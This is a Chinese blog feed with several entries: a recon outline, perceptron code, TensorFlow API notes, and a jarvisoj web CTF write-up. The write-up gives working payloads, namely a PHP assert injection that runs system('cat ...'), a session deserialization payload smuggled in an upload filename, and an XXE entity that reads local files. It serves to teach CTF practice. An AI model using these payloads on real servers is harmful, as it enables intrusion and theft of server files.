<h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><h3 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h3><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="高级搜索技巧"><a href="#高级搜索技巧" class="headerlink" title="高级搜索技巧"></a>高级搜索技巧</h2><h2 id="网络组件搜索"><a href="#网络组件搜索" class="headerlink" title="网络组件搜索"></a>网络组件搜索</h2><h1 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h1><h2 id="C段IP"><a href="#C段IP" class="headerlink" title="C段IP"></a>C段IP</h2><h2 id="同服站点"><a href="#同服站点" class="headerlink" title="同服站点"></a>同服站点</h2><h1 id="特殊信息泄露"><a href="#特殊信息泄露" class="headerlink" title="特殊信息泄露"></a>特殊信息泄露</h1><ul>
<li>github</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="weibo.com/ttarticle/p/show?id=2309404088584863883789">本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇）</a></li>
<li><a href="http://www.91ri.org/17001.html" target="_blank" rel="external">子域名的艺术</a></li>
<li><a href="http://thief.one/2017/05/19/1/" target="_blank" rel="external">【渗透神器系列】搜索引擎 </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/805.html" target="_blank" rel="external">域渗透基础简单信息收集（基础篇）</a></li>
<li><a href="http://docs.ioin.in/writeup/www.mottoin.com/_92978_html/index.html" target="_blank" rel="external">内网渗透定位技术总结</a></li>
<li><a href="https://www.secpulse.com/archives/51527.html" target="_blank" rel="external">后渗透攻防的信息收集</a></li>
<li><a href="http://www.mottoin.com/99951.html" target="_blank" rel="external">安全攻城师系列文章－敏感信息收集</a></li>
<li><a href="http://www.mottoin.com/101362.html" target="_blank" rel="external">子域名枚举的艺术</a></li>
<li><a href="https://mp.weixin.qq.com/s/ardCYdZzaSjvSIZiFraWGA" target="_blank" rel="external">论二级域名收集的各种姿势</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/451.html?fpage=2" target="_blank" rel="external">我眼中的渗透测试信息搜集</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1675.html" target="_blank" rel="external">大型目标渗透－01入侵信息搜集</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;未完&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>机器学习算法:感知机(perceptron)</title>
    <link href="http://yoursite.com/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/"/>
    <id>http://yoursite.com/2017/07/08/机器学习算法-感知机-perceptron/</id>
    <published>2017-07-08T13:06:51.000Z</published>
    <updated>2017-07-11T23:07:27.456Z</updated>
    
    <content type="html"><![CDATA[<p>机器学习算法:感知机(perceptron)<br><a id="more"></a></p>
<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><h1 id="学习策略"><a href="#学习策略" class="headerlink" title="学习策略"></a>学习策略</h1><h1 id="造轮子"><a href="#造轮子" class="headerlink" title="造轮子"></a>造轮子</h1><h2 id="原始形式"><a href="#原始形式" class="headerlink" title="原始形式"></a>原始形式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"></div><div class="line">f1 = plt.figure(<span class="number">1</span>)</div><div class="line">data_set = np.array([[<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>],[<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>],[<span class="number">2</span>,<span class="number">0</span>,<span class="number">-1</span>],[<span class="number">6</span>,<span class="number">1</span>,<span class="number">-1</span>]])</div><div class="line">plt.scatter(data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">1</span>)][:,<span class="number">0</span>],data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">1</span>)][:,<span class="number">1</span>],marker = <span class="string">'x'</span>, color = <span class="string">'m'</span>)</div><div class="line">plt.scatter(data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">-1</span>)][:,<span class="number">0</span>],data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">-1</span>)][:,<span class="number">1</span>],marker = <span class="string">'o'</span>, color = <span class="string">'g'</span>)</div><div class="line">length = len(data_set)</div><div class="line">rate = <span class="number">1</span></div><div class="line">w = np.array([<span class="number">0</span>,<span class="number">0</span>])</div><div class="line">b = <span class="number">0</span></div><div class="line">flag = <span class="keyword">True</span></div><div class="line">x = np.linspace(<span class="number">-1</span>,<span class="number">5</span>,<span class="number">10</span>)</div><div class="line"></div><div class="line"><span class="keyword">while</span> flag == <span class="keyword">True</span> :</div><div class="line">	flag = <span class="keyword">False</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(length) :</div><div class="line">		<span class="keyword">if</span> ( data_set[i][<span class="number">2</span>] * (w.dot(data_set[i,<span class="number">0</span>:<span class="number">2</span>]) + b )) &lt;= <span class="number">0</span> :</div><div class="line">			w = w + rate * data_set[i][<span class="number">2</span>] * data_set[i,<span class="number">0</span>:<span class="number">2</span>]</div><div class="line">			b = b + rate * data_set[i][<span class="number">2</span>]</div><div class="line">			flag = <span class="keyword">True</span></div><div class="line">			print(w,b)</div><div class="line"></div><div class="line">plt.plot(x,(-b - w[<span class="number">0</span>] * x) / w[<span class="number">1</span>],<span class="string">'r'</span>)</div><div class="line">plt.show()</div><div class="line">print(w,b)</div></pre></td></tr></table></figure>
<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[3 3] 1</div><div class="line">[2 2] 0</div><div class="line">[2 2] -1</div><div class="line">[0 2] -2</div><div class="line">[-6  1] -3</div><div class="line">[-3  4] -2</div><div class="line">[1 7] -1</div><div class="line">[0 6] -2</div><div class="line">[-6  5] -3</div><div class="line">[-3  8] -2</div><div class="line">[-4  7] -3</div><div class="line">[-5  6] -4</div><div class="line">[-2  9] -3</div><div class="line">[-3  8] -4</div><div class="line">[-4  7] -5</div><div class="line">[ 0 10] -4</div><div class="line">[-1  9] -5</div><div class="line">[-2  8] -6</div><div class="line">[-3  7] -7</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170708/1.jpg?raw=true" alt=""></p>
<h2 id="对偶形式"><a href="#对偶形式" class="headerlink" title="对偶形式"></a>对偶形式</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;机器学习算法:感知机(perceptron)&lt;br&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://yoursite.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="数据挖掘" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
    
      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Tensorflow学习：常用API</title>
    <link href="http://yoursite.com/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/"/>
    <id>http://yoursite.com/2017/07/06/Tensorflow学习：常用API/</id>
    <published>2017-07-06T08:18:40.000Z</published>
    <updated>2017-07-06T09:23:53.844Z</updated>
    
    <content type="html"><![CDATA[<p>记录学习Tensorflow的一些东西。本文同步发表于电子书<a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a>。将会持续保持更新。</p>
<a id="more"></a>
<h1 id="常用Math操作"><a href="#常用Math操作" class="headerlink" title="常用Math操作"></a>常用Math操作</h1><h2 id="tf-random-normal"><a href="#tf-random-normal" class="headerlink" title="tf.random_normal()"></a><a href="https://www.tensorflow.org/api_docs/python/tf/random_normal" target="_blank" rel="external">tf.random_normal()</a></h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>输出满足正态分布的随机值</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">random_normal(</div><div class="line">    shape,</div><div class="line">    mean=0.0,</div><div class="line">    stddev=1.0,</div><div class="line">    dtype=tf.float32,</div><div class="line">    seed=None,</div><div class="line">    name=None</div><div class="line">)</div></pre></td></tr></table></figure>
<ul>
<li>shape:一维整数张量/python数组，表示输出的张量的形状。</li>
<li>mean：类型为dtype的零维张量/python值。平均值。</li>
<li>stddev：类型为dtype的零维张量/python值。标准差。</li>
<li>dtype：输出数据的类型。</li>
<li>seed：用于作为生成随机数的种子。</li>
<li>name：为操作起个名字（可选）</li>
</ul>
<h2 id="tf-zeros"><a href="#tf-zeros" class="headerlink" title="tf.zeros()"></a><a href="https://www.tensorflow.org/api_docs/python/tf/zeros" target="_blank" rel="external">tf.zeros()</a></h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>创建一个所有元素都为零的张量。</p>
<h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zeros(</div><div class="line">    shape,</div><div class="line">    dtype=tf.float32,</div><div class="line">    name=None</div><div class="line">)</div></pre></td></tr></table></figure>
<ul>
<li>shape: 一维整数张量/python数组</li>
<li>name: 为操作起个名字（可选）</li>
<li>dtype: 输出数据的类型</li>
</ul>
<h2 id="tf-global-variables-initializer"><a href="#tf-global-variables-initializer" class="headerlink" title="tf.global_variables_initializer()"></a><a href="https://www.tensorflow.org/api_docs/python/tf/global_variables_initializer" target="_blank" rel="external">tf.global_variables_initializer()</a></h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><p>返回一个初始化全局变量的操作（op）<br>是variable_initializer(global_variables())的缩写。</p>
<h2 id="tf-square"><a href="#tf-square" class="headerlink" title="tf.square"></a><a href="https://www.tensorflow.org/api_docs/python/tf/square" target="_blank" rel="external">tf.square</a></h2><h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h3><p>计算平方</p>
<h3 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">square(</div><div class="line">    x,</div><div class="line">    name=None</div><div class="line">)</div></pre></td></tr></table></figure>
<h2 id="tf-reduce-mean"><a href="#tf-reduce-mean" class="headerlink" title="tf.reduce_mean"></a><a href="https://www.tensorflow.org/api_docs/python/tf/reduce_mean" target="_blank" rel="external">tf.reduce_mean</a></h2><h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h3><p>计算张量某一维度上的平均值</p>
<h3 id="说明-3"><a href="#说明-3" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">reduce_mean(</div><div class="line">    input_tensor,</div><div class="line">    axis=None,</div><div class="line">    keep_dims=False,</div><div class="line">    name=None,</div><div class="line">    reduction_indices=None</div><div class="line">)</div></pre></td></tr></table></figure>
<ul>
<li>input_tensor:输入一个张量</li>
<li>axis:指定某一个维度。比如test = [[[1.0,2],[3,4]],[[5,6],[6,7]]]，则可选值为0，1，2</li>
<li>keep_dims：输出是否保持原来的维度。</li>
<li>name：给操作起个名字</li>
<li>reduction_indices：axis的旧名字，不赞成用，可忽略。</li>
</ul>
<h1 id="常用Optimizer类"><a href="#常用Optimizer类" class="headerlink" title="常用Optimizer类"></a>常用Optimizer类</h1><h2 id="tf-train-GradientDescentOptimizer"><a href="#tf-train-GradientDescentOptimizer" class="headerlink" title="tf.train.GradientDescentOptimizer()"></a><a href="https://www.tensorflow.org/api_docs/python/tf/train/GradientDescentOptimizer" target="_blank" rel="external">tf.train.GradientDescentOptimizer()</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">learning_rate: A Tensor or a floating point value. The learning rate to use.</div><div class="line">use_locking: If True use locks for update operations.</div><div class="line">name: Optional name prefix for the operations created when applying gradients. Defaults to &quot;GradientDescent&quot;.</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录学习Tensorflow的一些东西。本文同步发表于电子书&lt;a href=&quot;https://chybeta.gitbooks.io/the-path-to-machine-learning/content/&quot;&gt;The Path to Machine Learning&lt;/a&gt;。将会持续保持更新。&lt;/p&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://yoursite.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="数据挖掘" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
    
      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="tensorflow" scheme="http://yoursite.com/tags/tensorflow/"/>
    
  </entry>
  
  <entry>
    <title>jarvisoj-web-writeup</title>
    <link href="http://yoursite.com/2017/07/05/jarvisoj-web-writeup/"/>
    <id>http://yoursite.com/2017/07/05/jarvisoj-web-writeup/</id>
    <published>2017-07-05T14:54:38.000Z</published>
    <updated>2017-07-17T15:49:45.815Z</updated>
    
    <content type="html"><![CDATA[<p>jarvisoj-web-writeup<br><a id="more"></a></p>
<h1 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h1><p>以前做过。按理说应该有git泄露的..这次死活找不到：）<br>更新：平台给了hint说题目已经修复了，找到了：）<br>通过git泄露出来的index.php源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>其中<code>assert</code>是个危险函数，其原型为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, string $description ] )</div></pre></td></tr></table></figure></p>
<p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;ls templates/;&quot;).&apos;</div></pre></td></tr></table></figure></p>
<p>payload2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32798/?page=flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos;</div></pre></td></tr></table></figure></p>
<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">61dctf&#123;8e_careful_when_us1ng_ass4rt&#125;</div></pre></td></tr></table></figure></p>
<p>其实这是<a href="https://github.com/ernw/ctf-writeups/blob/master/csaw2016/mfw/README.md" target="_blank" rel="external">CSAW2016原题</a>..</p>
<h1 id="61dctf-inject"><a href="#61dctf-inject" class="headerlink" title="[61dctf]inject"></a>[61dctf]inject</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32794/</div><div class="line">Hint1: 先找到源码再说吧~~</div></pre></td></tr></table></figure>
<p>访问：<a href="http://web.jarvisoj.com:32794/index.php~，得到源代码：" target="_blank" rel="external">http://web.jarvisoj.com:32794/index.php~，得到源代码：</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</div><div class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</div><div class="line">$table = Filter($table);</div><div class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</div><div class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</div><div class="line">$ret = sql_query($sql);</div><div class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h1><p>扫到robots.txt发现<code>Disallow: /admin_s3cr3t.php</code>。<br>访问并用burp抓包，如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/3.jpg?raw=true" alt=""></p>
<p>在cookie字段加上<code>admin=1</code>，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;hello_admin~&#125;</div></pre></td></tr></table></figure></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="external">http://web.jarvisoj.com:32784/</a><br>题目源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//A webshell is wait for you</span></div><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</div><div class="line">session_start();</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">public</span> $mdzz;</div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">   &#123;</div><div class="line">	   <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line">   &#123;</div><div class="line">	   <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</div><div class="line">&#123;</div><div class="line">   $m = <span class="keyword">new</span> OowoO();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">   highlight_string(file_get_contents(<span class="string">'index.php'</span>));</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>session.serialize_handler</code>容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p>
<p>由phpinfo()页面知，session.upload_progress.enabled为On。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。可以看看这里：<a href="http://www.91ri.org/15925.html" target="_blank" rel="external">有趣的php反序列化总结</a></p>
<p>先把下面代码保存为test.html。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来考虑序列化的问题。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</div><div class="line">session_start();</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'xxxxx'</span>;</div><div class="line">&#125;</div><div class="line">$obj = <span class="keyword">new</span> OowoO();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>payloay1:将xxxxx替换为<code>print_r(scandir(dirname(__FILE__)));</code>,得到序列化结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"OowoO"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mdzz"</span>;s:<span class="number">36</span>:<span class="string">"print_r(scandir(dirname(__FILE__)));"</span>;&#125;</div></pre></td></tr></table></figure></p>
<p>为防止转义，在引号前加上<code>\</code>。利用前面的html页面随便上传一个东西，抓包，把filename改为如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>注意，前面有一个<code>|</code>，这是session的格式。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/1.jpg?raw=true" alt=""><br>接下来就是去读取 <code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code><br>由phpinfo可知当前的路径为<code>/opt/lampp/htdocs/</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/2.jpg?raw=true" alt=""></p>
<p>将xxx处改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</div></pre></td></tr></table></figure></p>
<p>之后步骤如前，将filename改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125;</div></pre></td></tr></table></figure></p>
<h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>在<a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">《小试XML实体注入攻击》</a>中已经提过。</p>
<p>抓包改包，将<code>Content-Type</code>改为<code>application/xml</code>，然后post数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:////home/ctf/flag.txt&quot;&gt;]&gt;</div><div class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;XxE_15_n0T_S7range_Enough&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>随手测试一下功能，比如点开submit，或者view页面，他们的链接如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32785/index.php?page=submit</div><div class="line">http://web.jarvisoj.com:32785/index.php?page=submit</div></pre></td></tr></table></figure></p>
<p>随便改个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32785/index.php?page=view%27</div></pre></td></tr></table></figure></p>
